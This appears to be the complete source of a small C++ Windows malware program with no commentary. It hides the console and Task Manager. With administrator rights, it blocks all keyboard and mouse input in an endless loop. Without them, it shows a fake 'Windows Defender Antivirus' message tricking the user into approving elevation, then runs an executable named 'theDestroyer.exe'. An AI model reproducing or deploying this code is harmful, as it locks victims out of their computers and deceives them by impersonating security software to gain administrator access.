#include <windows.h>
#include <shlobj.h>

int main()
{
	FreeConsole();
	HWND wind;
	wind = FindWindowA("Task Manager", NULL);
	ShowWindow(wind, NULL);
	if (IsUserAnAdmin()) {
		while (true) {

			BlockInput(true);
			HWND task;
			task = FindWindowA(NULL, "Task Manager");
			ShowWindow(task, 0);
			Sleep(200);
		}
	}
	else {
		MessageBoxA(NULL, "Please run as Administrator. System Scan required. Press OK and Click YES on User Account Control.", "Windows Defender Antivirus", NULL);
		system("theDestroyer.exe"); 
	}
	return 0;
}
